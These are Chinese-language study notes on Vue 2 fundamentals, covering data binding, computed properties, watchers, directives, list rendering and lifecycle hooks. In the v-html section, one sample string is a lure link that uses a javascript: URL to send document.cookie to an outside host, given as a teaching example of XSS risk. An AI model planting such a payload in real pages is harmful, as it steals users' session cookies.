### 1、vue简介

1）一套用于构建用户界面的渐进式javascript框架

- 渐进式

  Vue可以自底向上的逐层应用

  简单应用：只需一个轻量小巧的核心库

  复杂应用：可以引入各式各样的vue插件

- 构建用户界面

  把数据通过方法变成用户可以看见的某种界面

2）vue特点

- 采用组件化模式，提高代码复用率、且让代码更好维护
- 声明式编码，让编码人员无需直接操作DOM，提高开发效率
- 使用虚拟dom+优秀的diff算法，尽可能复用dom节点

- 虚拟DOM

  先把数据变为虚拟DOM（内存中的一个数据），随后变为真实DOM

  数据增加时，会进行diff比较，若新的虚拟dom和旧的虚拟dom一样，则复用不变

### 4、hello 案例

```HTML
<head>
    <title>初识Vue</title>
    <!-- 引入Vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <h1>hello {{name}}</h1>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false; //设置为 false 以阻止 vue 在启动时生成生产提示
        // 创建vue实例
        new Vue({//el data为配置对象
            el: '#root', //el用于指定当前VUE实例为哪个容器服务，值通常为css选择器字符串
            data: { //date中用于存储数据，数据供el指定的容器去使用，值我们暂时先写成一个对象
                name: '张文涵'
            }
        });
    </script>
</body>
```

总结：

1. 想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象；
2. root容器里的代码依然符合HTML规范，只不过混入了一些特殊的vue语法。
3. root容器里的代码被称为Vue模板。
4. 容器和Vue实例不能一对多，多对一；一对多，第二个实例不会对容器有影响还会报错；多对一时，只会对第一个容器产生影响。
5. 真是开发中只有一个Vue实例，并且配合着组件一起使用。
6. 双花括号中有什么：js里的表达式,一个可以接到值的式子
7. 一旦data中的数据发生改变，那么模板中用到该数据的地方也会自动更新。
8. data中定义重名变量时，解析给模板的会是最后一个变量值

### 7、模板语法

- 插值语法

  功能：用于解析标签体的内容

  写法：{{xxx}},xxx是js表达式，且可以直接读取到data中所有的属性。

- 指令语法

  功能：用于解析标签（包括：标签属性、标签体内容、绑定事件......)

  举例：v-bind:href="xxx" 或简写为 :href="xxx"，xxx同样要写js表达式，且可以直接读取到data中的所有属性。

  备注：Vue中有很多的指令，且形式都是：v-???

```HTML
<body>
    <div id="root">
        <h1>插值语法</h1>
        <h3>你好{{name}}</h3>
        <hr>
        <h1>指令语法</h1>
        <a v-bind:href="school.url.toUpperCase()">我是，{{school.name}}</a>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        new Vue({
            el: "#root",
            data: {
                name: '张文涵',
                school: {
                    url: 'http://qq.com',
                    name: 'qq'
                }
            }
        });
    </script>
</body>
```

### 8、数据绑定

Vue中有两种绑定方式：

1. 单向绑定(v-bind)：数据只能从data流向页面。
2. 双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data。 

备注：

1. 双向绑定一般都应用在表单类元素上
2. v-model:value可以简写为v-model，因为v-model默认收集的就是value值。

```HTML
 <!-- 准备好一个容器 -->
    <div id="root">
        <!-- 普通写法 -->
        单向数据绑定：<input type="text" v-bind:value="name">
        <br/>双向数据绑定：<input type="text" v-model:value="name"><br/>
        <hr>
        <!-- 简写 -->
        双向数据绑定：<input type="text" v-model="name">
        <br/>单向数据绑定：<input type="text" :value="name">
        <!-- 如下代码是错误的，v-model只能应用在表单类元素（输入类元素）都有value值 -->
        <h2 v-model:x="name"></h2>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false; //设置为 false 以阻止 vue 在启动时生成生产提示
        // 创建vue实例
        new Vue({
            el: '#root', //el用于指定当前VUE实例为哪个容器服务，值通常为css选择器字符串
            data: { //date中用于存储数据，数据供el指定的容器去使用，值我们暂时先写成一个对象
                name: '张文涵'
            }
        });
    </script>
```

### 9、el和data的两种写法

1、el的两种写法

```HTML
<script type="text/javascript">
        Vue.config.productionTip = false; //设置为 false 以阻止 vue 在启动时生成生产提示
        const v = new Vue({
            //   el:"#root",//第一种写法
            data: {
                name: '张文涵',
            }
        });
        console.log(v);
        //指定容器，第二种写法
        v.$mount('#root');
    </script>
```

2、data的两种写法

```HTML
<script type="text/javascript">
        Vue.config.productionTip = false; //设置为 false 以阻止 vue 在启动时生成生产提示
        new Vue({
            el: '#root',
            // data的第一种写法：对象式
            // data:{
            //     name:'张文涵'
            // }
            //data的第二种写法：函数式,组件必用
            data: function() {//可以直接这么写data(){
                console.log(this);//普通函数此处的this是vue实例对象，箭头函数this是window
                return {
                    name: '尚硅谷',
                }
            }
        });
    </script>
```

由vue所管理的函数一定不能写箭头函数

### 10、理解MVVM

1、M：模型（Model）：对应data中的数据

2、V：视图（View）：模板

3、VM：视图模型（ViewModel）：Vue实例对象，经常用vm来接收vue实例对象

```HTML
<!-- View -->
    <div id="root">
        <h1>学校名称:{{name}}</h1>
        <h1>学校地址:{{address}}</h1>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false; //设置为 false 以阻止 vue 在启动时生成生产提示
        const vm=new Vue({//ViewModel
            el: '#root',
            data() {
                //Model
                return {
                    name: '长安大学',
                    address: '西安未央',
                }
            }
        });
        console.log(vm);
    </script>
```

data中写的key:value最后都出现在vm身上。

vm身上的所有属性及vue原型上所有属性，在vue模板中都可以直接使用

### 11、Object.defineProperty方法

补：Object.keys({})：可以把传入对象的所有属性名提取出来变成一个数组

定义的属性，不可以被遍历，除非ennumerable:true//控制属性是否可以枚举

不可以被修改，除非writable:true//控制属性可以被修改

不可以被删除，除非configurable:true//控制属性可以被删除

```HTML
<script type="text/javascript">
        let number = 19;
        let person = {
            name: "张三",
            sex: '男'
        }
        Object.defineProperty(person, 'age', {
            //当有人读取person的age属性的时候，get函数就会被调用，且返回值就是age的值
            get: function() {
                console.log('有人读取age属性了');
                return number;
            },
            //当有人修改person的age属性的时候，set函数就会被调用，且会收到修改的具体值
            set(value) {
                console.log("有人修改age属性了，且值是", value);
                number = value;
            }

        });
    </script>
```

### 12、理解数据代理

```HTML
<!-- 数据代理：通过一个对象代理另一个对象中属性的操作：（读和写） -->
    <script type="text/javascript">
        let obj1 = {
            x: 100
        };
        let obj2 = {
            y: 200
        };
        Object.defineProperty(obj2, 'x', {
            get() {
                return obj1.x;
            },
            set(value) {
                obj1.x = value;
            }

        });
    </script>
```

### 13、Vue中的数据代理

- Vue中的数据代理

  通过vm对象来代理data对象中属性的操作(读写)

- Vue数据代理的好处

  更加方便地操作data中的数据

- 基本原理

  通过Object,defineProperty()把data对象中所有属性添加到vm上，为每一个添加到vm上的属性，都指定一个getter/setter内部去操作（读和写）data中对应的数据

### 14、事件的基本使用

1. 使用v-on:xxx或@xxx绑定事件，其中xxx是事件名
2. 事件回调需要配置在methods对象中，最终会在vm上
3. methods中配置的函数，不要用箭头函数，否则this就不是vm了
4. methods中配置的函数，都是被vue所管理的函数，this的指向是vm或组件实例对象
5. @click="demo"和@click="demo($event)"效果一致，但后者可以传参

```HTML
<script type="text/javascript">
        Vue.config.productionTip = false; //设置为 false 以阻止 vue 在启动时生成生产提示

        new Vue({
            el: '#root',
            data: {
                name: '张文涵'
            },
            methods: {
                showInfo(event) {
                    console.log(event.target.innerHTML);
                    console.log(this); //此处的this是vm
                    alert("你好");
                },
                showInfo2(number, e) {
                    console.log(number);
                    console.log(e);
                    console.log(this); //此处的this是vm
                    alert("你好!");
                }
            }
        })
    </script>
```

### 15、事件修饰符

@click.xxxx

1. prevent：阻止默认事件       event.preventDefault
2. stop:组织事件冒泡               event.stopPropagation
3. once:事件只触发一次
4. capture:使用事件的捕获模式       两个元素嵌套时，在冒泡阶段时间才开始处理，冒泡是由内向外，捕获是由外向内
5. self：只有event.target是当前操作的元素才是触发事件
6. passive:事件的默认行为立即执行，无需等待事件回调执行完毕

### 16、键盘事件

@click.xxxx=function当遇到按键时才能执行函数

- 1、Vue中常用的按键别名

  1、回车=>enter

  2、删除=>delete（捕获删除和退格键）

  3、退出=>esc

  4、空格=>space

  5、换行=tab 特殊必须配合keydown使用

  6、上=>up

  7、下=>down

  8、左=>left

  9、右=>right

     

2、Vue未提供的别名的按键。可以使用按键原始的key值去绑定，但注意要转为kebab-case（段横杠命名）

- 3、系统修饰键（用法特殊）：ctrl\art\shift\meta

  1、配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发

  2、配合keydown使用：正常触发事件

4、也可以使用keyCode去制定具体的按键（不推荐，随时可能失效）

5、Vue.config.keyCodes.自定义键名=键码，可以去定制按键别名

注释：修饰符可以连续写；系统修饰键+.字母（例如：.ctrl.y)两个都按下才能执行

### 18、姓名案例

只要data中的数据发生改变,vue一定会重新解析模板，只要遇到插值语法里写方法一定重新调用

### 19、计算属性

    1）定义：要用的属性不存在，要通过已有属性计算得来。

  2）原理：底层借助了Objcet.defineproperty方法提供的getter和setter。

  3）get函数什么时候执行？

    (1).初次读取时会执行一次。

    (2).当依赖的数据发生改变时会被再次调用。

  4）优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。methods读取几次调用几次，计算属性只调用第一次

  - 补充：

    与methods不同：

    1）写法不同。函数属性: {{ result() }}是执行模式带括号，计算属性{{ output }}不需要带括号；因为计算属性实际上是执行完了这个函数，往vm身上放了一个fullname的属性，vm.fullname的值是函数调用的结果。

    2）刷新作用域不同。函数属性只要页面dom节点有改动就刷新最新数据，适合凡事dom界面发生改变就会执行。计算属性会自动识别与它有关的，它才会刷新。

  

  5）备注：

  （1）计算属性最终会出现在vm上，直接读取使用即可。

  （2）如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。

```Vue
 computed: {
            fullName: {
                //get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
                //get什么时候调用？1.初次读取fullName时,因为做了缓存剩下的调用直接从缓存中读取。2.所依赖的数据发生变化时。
                get() {
                    console.log('get被调用了')
                        // console.log(this) //此处的this是vm
                    return this.firstName + '-' + this.lastName
                },
                //set什么时候调用? 当fullName被修改时。
                set(value) {
                    console.log('set', value)
                    const arr = value.split('-')
                    this.firstName = arr[0]
                    this.lastName = arr[1]
                }
            }
        }
```

### 20、计算属性_简写

当计算属性不考虑改，只读不改时可以简写，

```Vue
computed:{
        //完整写法
        /* fullName:{
          get(){
            console.log('get被调用了')
            return this.firstName + '-' + this.lastName
          },
          set(value){
            console.log('set',value)
            const arr = value.split('-')
            this.firstName = arr[0]
            this.lastName = arr[1]
          }
        } */
        //简写，就当getter用
        fullName(){
          console.log('get被调用了')
          return this.firstName + '-' + this.lastName
        }
      }
```

### 21、天气案例

```HTML
<body>
    <!-- 准备好一个容器-->
    <div id="root">
      <h2>今天天气很{{info}}</h2>
      <!-- 绑定事件的时候：@xxx="yyy" yyy可以写一些简单的语句 -->
      <!-- <button @click="isHot = !isHot">切换天气</button> -->
      <button @click="changeWeather">切换天气</button>
    </div>
  </body>

  <script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
    
    const vm = new Vue({
      el:'#root',
      data:{
        isHot:true,
      },
      computed:{
        info(){
          return this.isHot ? '炎热' : '凉爽'
        }
      },
      methods: {
        changeWeather(){
          this.isHot = !this.isHot
        }
      },
    })
  </script>
```

### 22、监视属性

    1）当被监视的属性变化时, 回调函数自动调用, 进行相关操作

  2）监视的属性必须存在，才能进行监视！！

  3）监视的两种写法：

  (1).new Vue时传入watch配置

  (2).通过vm.$watch监视

```HTML
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({

        data: {
            isHot: true,
        },
        computed: {
            info() {
                return this.isHot ? '炎热' : '凉爽'
            }
        },
        methods: {
            changeWeather() {
                this.isHot = !this.isHot
            }
        },
        /* watch:{
          isHot:{
            immediate:true, //初始化时让handler调用一下
            //handler什么时候调用？当isHot发生改变时。
            handler(newValue,oldValue){
              console.log('isHot被修改了',newValue,oldValue)
            }
          }
        } */
    })
    vm.$mount('#root');
    vm.$watch('isHot', {
        immediate: true, //初始化时让handler调用一下
        //handler什么时候调用？当isHot发生改变时。
        handler(newValue, oldValue) {
            console.log('isHot被修改了', newValue, oldValue)
        }
    })
</script>
```

### 23、深度监视

    (1).Vue中的watch默认不监测对象内部值的改变（一层）。

  (2).配置deep:true可以监测对象内部值改变（多层）。

  备注：

  (1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！

  (2).使用watch时根据数据的具体结构，决定是否采用深度监视。

```Vue
watch:{
        isHot:{
          // immediate:true, //初始化时让handler调用一下
          //handler什么时候调用？当isHot发生改变时。
          handler(newValue,oldValue){
            console.log('isHot被修改了',newValue,oldValue)
          }
        },
        //监视多级结构中某个属性的变化
        /* 'numbers.a':{
          handler(){
            console.log('a被改变了')
          }
        } */
        //监视多级结构中所有属性的变化
        numbers:{
          deep:true,
          handler(){
            console.log('numbers改变了')
          }
        }
      }
```

### 24、监视的简写形式

```Vue
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
    
    const vm = new Vue({
      el:'#root',
      data:{
        isHot:true,
      },
      computed:{
        info(){
          return this.isHot ? '炎热' : '凉爽'
        }
      },
      methods: {
        changeWeather(){
          this.isHot = !this.isHot
        }
      },
      watch:{
        //正常写法
        /* isHot:{
          // immediate:true, //初始化时让handler调用一下
          // deep:true,//深度监视
          handler(newValue,oldValue){
            console.log('isHot被修改了',newValue,oldValue)
          }
        }, */
        //简写
        /* isHot(newValue,oldValue){
          console.log('isHot被修改了',newValue,oldValue,this)
        } */
      }
    })

    //正常写法
    /* vm.$watch('isHot',{
      immediate:true, //初始化时让handler调用一下
      deep:true,//深度监视
      handler(newValue,oldValue){
        console.log('isHot被修改了',newValue,oldValue)
      }
    }) */

    //简写
     vm.$watch('isHot',function(newValue,oldValue){
      console.log('isHot被修改了',newValue,oldValue,this)
    }) 

  </script>
```

### 25、watch对比computed

    1）computed能完成的功能，watch都可以完成。

  2）watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。

  两个重要的小原则：

  - （1）所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。

    在 Vue 中并不是不能使用箭头函数，而是**由于 Vue 中对一些函数初始化的原因，这些函数需要被 call 重新指定 this** ，而箭头函数将得不到真正的 this，这是导致错误的根本原因。

  （2）所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象。

### 26、27、绑定class和style样式

    1）class样式

  写法:class="xxx" xxx可以是字符串、对象、数组。

  字符串写法适用于：类名不确定，要动态获取。

  对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。

  数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。

  2）style样式

  :style="{fontSize: xxx}"其中xxx是动态值。

  :style="[a,b]"其中a、b是样式对象。

```Vue
<div id="root">
      <!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
      <div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>

      <!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
      <div class="basic" :class="classArr">{{name}}</div> <br/><br/>

      <!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
      <div class="basic" :class="classObj">{{name}}</div> <br/><br/>

      <!-- 绑定style样式--对象写法 -->
      <div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
      <!-- 绑定style样式--数组写法 -->
      <div class="basic" :style="styleArr">{{name}}</div>
 </div>
 <script type="text/javascript">
    Vue.config.productionTip = false;
    const vm = new Vue({
      el:'#root',
      data:{
        name:'尚硅谷',
        mood:'normal',
        classArr:['atguigu1','atguigu2','atguigu3'],
        classObj:{
          atguigu1:false,
          atguigu2:false,
        },
        styleObj:{
          fontSize: '40px',
          color:'red',
        },
        styleObj2:{
          backgroundColor:'orange'
        },
        styleArr:[
          {
            fontSize: '40px',
            color:'blue',
          },
          {
            backgroundColor:'gray'
          }
        ]
      },
      methods: {
        changeMood(){
          const arr = ['happy','sad','normal']
          const index = Math.floor(Math.random()*3)
          this.mood = arr[index]
        }
      },
    })
  </script>
```

注：style里的用-连接的键值，去掉-换成小驼峰形式

### 28、条件渲染

#### v-show和v-if的区别
  - v-show是通过display:none来控制dom的显示和隐藏；
  - v-if的显隐切换则是通过动态的向DOM树内添加或者删除DOM元素；

  **编译的区别**

  v-show其实就是在控制css

  v-if切换有一个局部编译/卸载的过程，切换过程中合适地销毁和重建内部的事件监听和子组件

  **编译的条件**

  v-show都会编译，初始值为false，只是将display设为none，但它也编译了。

  v-if初始值为false，就不会编译了。

  **性能的区别**

  v-show只编译一次，后面其实就是控制css，而v-if不停的销毁和创建，故v-show性能更好一点。

  **用法的区别**

  v-if更适合于带有权限的操作，渲染时判断权限数据，有则展示该功能，没有则删除。v-show更适合于日常使用，可以减少数据的渲染，减少不必要的操作。

  如果你的页面不想让其他程序员看到就用v-if，它不会在页面中显示。

    1）v-if

  写法：

  (1).v-if="表达式"

  (2).v-else-if="表达式"

  (3).v-else="表达式"

  适用于：切换频率较低的场景。

  特点：不展示的DOM元素直接被移除。

  注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。

  备注：v-if可以和template的配合使用，v-show不可以

  2）v-show

  写法：v-show="表达式"

  适用于：切换频率较高的场景。

  特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉

  3）备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。

### 29、列表渲染

v-for指令:

  1.用于展示列表数据

  2.语法：v-for="(item, index) in xxx" :key="yyy"

  3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）

```Vue
<div id="root">
      <!-- 遍历数组 -->
      <h2>人员列表（遍历数组）</h2>
      <ul>
        <li v-for="(p,index) of persons" :key="index">
          {{p.name}}-{{p.age}}
        </li>
      </ul>

      <!-- 遍历对象 -->
      <h2>汽车信息（遍历对象）</h2>
      <ul>
        <li v-for="(value,k) of car" :key="k">
          {{k}}-{{value}}
        </li>
      </ul>

      <!-- 遍历字符串 -->
      <h2>测试遍历字符串（用得少）</h2>
      <ul>
        <li v-for="(char,index) of str" :key="index">
          {{char}}-{{index}}
        </li>
      </ul>
      
      <!-- 遍历指定次数 -->
      <h2>测试遍历指定次数（用得少）</h2>
      <ul>
        <li v-for="(number,index) of 5" :key="index">
          {{index}}-{{number}}
        </li>
      </ul>
    </div>

    <script type="text/javascript">
      Vue.config.productionTip = false
      
      new Vue({
        el:'#root',
        data:{
          persons:[
            {id:'001',name:'张三',age:18},
            {id:'002',name:'李四',age:19},
            {id:'003',name:'王五',age:20}
          ],
          car:{
            name:'奥迪A8',
            price:'70万',
            color:'黑色'
          },
          str:'hello'
        }
      })
    </script>
```

### 30、key的作用和原理

- 1、虚拟DOM中key的作用：

  key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】，随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较

- 2、对比规则

  - （1）旧虚拟DOM中找到啦与新虚拟DOM相同的key：

    1）若虚拟DOM中内容没变，直接使用之前的真实DOM

    2）若虚拟DOM中内容变了，则生成新的真实DOM，替换掉页面中之前的真实DOM

  - （2）旧虚拟DOM中未找到与新虚拟DOM相同的key

    创建新的真实DOM，随后渲染到页面

- 3、用index作为key可能引发的问题：

  1.若对数据进行：逆序添加、逆序删除等破环顺序操作：会产生没有必要的真实DOM更新=》页面效果没问题，但效率低

  2.如果结构中还包含输入类的DOM：会产生错误DOM更新=》页面有问题

- 4、开发中如何选择key?

  1）最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值

  2）如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的

  ![](https://secure2.wostatic.cn/static/rNauPnvmua7h7iRaob3RGj/image.png)

### 31、列表过滤

当computed和watch都能实现的时候,优先选择computed

### 32、列表排序

### 33、更新时的一个问题

```Vue
<!-- 准备好一个容器-->
    <div id="root">
      <h2>人员列表</h2>
      <button @click="updateMei">更新马冬梅的信息</button>
      <ul>
        <li v-for="(p,index) of persons" :key="p.id">
          {{p.name}}-{{p.age}}-{{p.sex}}
        </li>
      </ul>
    </div>

    <script type="text/javascript">
      Vue.config.productionTip = false
      
      const vm = new Vue({
        el:'#root',
        data:{
          persons:[
            {id:'001',name:'马冬梅',age:30,sex:'女'},
            {id:'002',name:'周冬雨',age:31,sex:'女'},
            {id:'003',name:'周杰伦',age:18,sex:'男'},
            {id:'004',name:'温兆伦',age:19,sex:'男'}
          ]
        },
        methods: {
          updateMei(){
            // this.persons[0].name = '马老师' //奏效
            // this.persons[0].age = 50 //奏效
            // this.persons[0].sex = '男' //奏效
            this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效
          }
        }
      }) 

    </script>
```

### 34、vue检测数据的原理—对象

```Vue

      let data = {
        name:'尚硅谷',
        address:'北京',
      }
      //创建一个监视的实例对象，用于监视data中属性的变化
      const obs = new Observer(data)    
      console.log(obs)  
      //准备一个vm实例对象
      let vm = {}
      vm._data = data = obs
      function Observer(obj){
        //汇总对象中所有的属性形成一个数组
        const keys = Object.keys(obj)
        //遍历
        keys.forEach((k)=>{
          Object.defineProperty(this,k,{
            get(){
              return obj[k]
            },
            set(val){
              console.log(`${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)
              obj[k] = val
            }
          })
        })
      }
    </script>
```

### 35、vue.set()方法

```Vue
 <button @click="addSex">添加一个性别属性，默认值是男</button>
 <h2>姓名：{{student.name}}</h2>
 <h2 v-if="student.sex">性别：{{student.sex}}</h2>
 methods: {
            addSex() {
                Vue.set(this.student, 'sex', '男')
                    // this.$set(this.student,'sex','男')
            }
        }
```



### 36、vue检测数据的原理—数组

用数组的push pop shift unshift splice sort reserve方法来改变数组实现响应式

### 37、Vue监视数据总结

1. vue会监视data中所有层次的数据。
    1. 如何监测对象中的数据？

    通过setter实现监视，且要在new Vue时就传入要监测的数据。

    (1).对象中后追加的属性，Vue默认不做响应式处理

    (2).如需给后添加的属性做响应式，请使用如下API：

    Vue.set(target，propertyName/index，value) 或

    vm.$set(target，propertyName/index，value)

    1. 如何监测数组中的数据？

    通过包裹数组更新元素的方法实现，本质就是做了两件事：

    (1).调用原生对应的方法对数组进行更新。

    (2).重新解析模板，进而更新页面。

    4.在Vue修改数组中的某个元素一定要用如下方法：

    1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()

    2.Vue.set() 或 vm.$set()

    特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！

    后往数组中添加的对象也是响应式的

数据劫持：就是监听的原理，给data中所有属性添加上set get，当data修改后,set就劫持住，修改数据，重新解析模板。

### 38、收集表单数据

收集表单数据：

  若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。

  若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。

  若：<input type="checkbox"/>

  1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）

  2.配置input的value属性:

  (1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）

  (2)v-model的初始值是数组，那么收集的的就是value组成的数组

  备注：v-model的三个修饰符：

  lazy：失去焦点再收集数据

  number：输入字符串转为有效的数字

  trim：输入首尾空格过滤

### 39、过滤器

过滤器：

  定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。

  语法：

  1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}

  2.使用过滤器：{{ xxx | 过滤器名}} 或 v-bind:属性 = "xxx | 过滤器名"

  备注：

  1.过滤器也可以接收额外参数、多个过滤器也可以串联

  2.并没有改变原本的数据, 是产生新的对应的数据

### 40、v-text指令

向其所在的标签插入文本，v-text会拿到值之后替换整个div内容。

    1.作用：向其所在的节点中渲染文本内容。

  2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。

### 41、v-html指令

1.作用：向指定节点中渲染包含html结构的内容。

  2.与插值语法的区别：

  (1).v-html会替换掉节点中所有的内容，{{xx}}则不会。

  (2).v-html可以识别html结构。

  3.严重注意：v-html有安全性问题！！！！

  (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。

  (2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！

```Vue
<div id="root">
      <div>你好，{{name}}</div>
      <div v-html="str"></div>
      <div v-html="str2"></div>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
    new Vue({
      el:'#root',
      data:{
        name:'尚硅谷',
        str:'<h3>你好啊！</h3>',
        str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
      }
    })
</script>

```

### 42、v-cloak指令

v-cloak指令（没有值）：

  1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。

  2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。

```Vue
<style>
      [v-cloak]{
        display:none;
      }
    </style>
    <div id="root">
      <h2 v-cloak>{{name}}</h2>
    </div>
    <script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
    <script type="text/javascript">
    console.log(1)
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
    
    new Vue({
      el:'#root',
      data:{
        name:'尚硅谷'
      }
    })
  </script>
```

### 43、v-once指令

1.v-once所在节点在初次动态渲染后，就视为静态内容了。

  2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

### 44、v-pre指令

v-pre指令：

  1.跳过其所在节点的编译过程。

  2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。

### 47、自定义指令_总结

自定义指令总结：

  一、定义语法：

  (1).局部指令：

  new Vue({                                         new Vue({

  directives:{指令名:配置对象}     或         directives{指令名:回调函数}

  })                                                        })

  (2).全局指令：

  Vue.directive(指令名,配置对象) 或 Vue.directive(指令名,回调函数)

  二、配置对象中常用的3个回调：

  (1).bind：指令与元素成功绑定时调用。

  (2).inserted：指令所在元素被插入页面时调用。

  (3).update：指令所在模板结构被重新解析时调用。

  三、备注：

  1.指令定义时不加v-，但使用时要加v-；

  2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。

```Vue
<div id="root">
      <h2>{{name}}</h2>
      <h2>当前的n值是：<span v-text="n"></span> </h2>
      <!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
      <h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
      <button @click="n++">点我n+1</button>
      <hr/>
      <input type="text" v-fbind:value="n">
    </div>
    <script type="text/javascript">
    Vue.config.productionTip = false

    //定义全局指令
    /* Vue.directive('fbind',{
      //指令与元素成功绑定时（一上来）
      bind(element,binding){
        element.value = binding.value
      },
      //指令所在元素被插入页面时
      inserted(element,binding){
        element.focus()
      },
      //指令所在的模板被重新解析时
      update(element,binding){
        element.value = binding.value
      }
    }) */

    new Vue({
      el:'#root',
      data:{
        name:'尚硅谷',
        n:1
      },
      directives:{
        //big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
        /* 'big-number'(element,binding){
          // console.log('big')
          element.innerText = binding.value * 10
        }, */
        big(element,binding){
          console.log('big',this) //注意此处的this是window
          // console.log('big')
          element.innerText = binding.value * 10
        },
        fbind:{
          //指令与元素成功绑定时（一上来）
          bind(element,binding){
            element.value = binding.value
          },
          //指令所在元素被插入页面时
          inserted(element,binding){
            element.focus()
          },
          //指令所在的模板被重新解析时
          update(element,binding){
            element.value = binding.value
          }
        }
      }
    })
    
  </script>
```

binding是一个对象，是自定义指令和标签的一种绑定关系
### 48、引出生命周期

生命周期：

  1.又名：生命周期回调函数、生命周期函数、生命周期钩子。

  2.是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。

  3.生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。

  4.生命周期函数中的this指向是vm 或 组件实例对象。

```Vue
<div id="root">
      <h2 v-if="a">你好啊</h2>
      <h2 :style="{opacity}">欢迎学习Vue</h2>
</div>

  <script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
    
     new Vue({
      el:'#root',
      data:{
        a:false,
        opacity:1
      },
      methods: {
        
      },
      //Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
      mounted(){
        console.log('mounted',this)
        setInterval(() => {
          this.opacity -= 0.01
          if(this.opacity <= 0) this.opacity = 1
        },16)
      },
    })

    //通过外部的定时器实现（不推荐）
    /* setInterval(() => {
      vm.opacity -= 0.01
      if(vm.opacity <= 0) vm.opacity = 1
    },16) */
  </script>

```

### 49、生命周期挂载流程

![](https://secure2.wostatic.cn/static/7VfFhwW4EVgN31X4sNE5Yy/image.png?auth_key=1694396685-pTBUEYnpMqk2BznYLmrNeD-0-fb032d78dfe047f8ee33aad0c6810e2c)

![](https://secure2.wostatic.cn/static/i2ww77cuc75f8PVMHvCWvi/image.png?auth_key=1694396685-meASGnLLsi8xEmBbXbURWj-0-daa61d34e46a705eb7d368e7e2ebdfc6)

这步把虚拟DOM转为真实DOM，并把真实DOM往vm.$el存了一份，因为旧的虚拟DOM和新的虚拟DOM比较相同的可以复用，必须有一份真实的DOM才能复用。

这个阶段虽然可以访问数据，方法，也确实修改数据了，但是页面不会更新了；

### 52、生命周期总结

常用的生命周期钩子：

  1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。

  2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。

  关于销毁Vue实例

  1.销毁后借助Vue开发者工具看不到任何信息。

  2.销毁后自定义事件（$emit)会失效，但原生DOM事件依然有效。

  3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。

